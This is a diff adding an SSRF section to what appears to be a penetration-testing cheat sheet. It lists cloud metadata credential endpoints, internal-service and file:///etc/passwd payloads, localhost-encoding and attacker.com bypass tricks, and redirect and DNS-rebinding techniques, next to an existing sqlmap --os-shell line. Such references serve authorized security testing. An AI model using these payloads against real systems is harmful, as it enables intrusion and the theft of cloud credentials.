@@ -642,3 +642,50 @@ sqlmap -u 'http://target.com/search?q=test' --os-shell
 - Different response size
 - Extra fields in JSON response
 - Status code changes (sometimes 403 with admin data inside)
+
+### SSRF (Server-Side Request Forgery)
+Exploit server-side request handling to access internal services, cloud metadata
+
+#### Cloud Metadata Endpoints
+```
+# AWS
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data
+
+# Google
+http://metadata.google.internal/computeMetadata/v1/
+
+# Azure
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+```
+
+#### Basic Protocols (all supported)
+```
+http://127.0.0.1:8080/
+http://localhost:22/
+file:///etc/passwd
+gopher://127.0.0.1:3306/_mysql
+dict://127.0.0.1:11211/stat
+ftp://internal-server/
+tftp://attacker/
+ldap://127.0.0.1
+data:text/plain;base64,SSBsb3ZlIFNRRkU=
+```
+
+#### Advanced Techniques
+1. **Redirect Chains**: Send server to your collab server (302) -> internal
+2. **DNS Rebinding**: Domain resolves to external, then 127.0.0.1 after TTL
+3. **URL Scheme Abuse**: ftp://, tftp://, ldap://, data: schemes
+4. **Bypass Methods**:
+   - http://127.0.0.1%00@attacker.com
+   - IPv6: http://[::1]
+   - Decimal: http://2130706433
+   - Hex: http://0x7f000001
+
+#### Testing Checklist
+- Parameter reflection in URL (parameter=...)
+- Image uploads (URL in metadata)
+- Webhooks
+- PDF generators
+- URL preview features
+- SSRF proxies: Burp Collaborator, Interact.sh
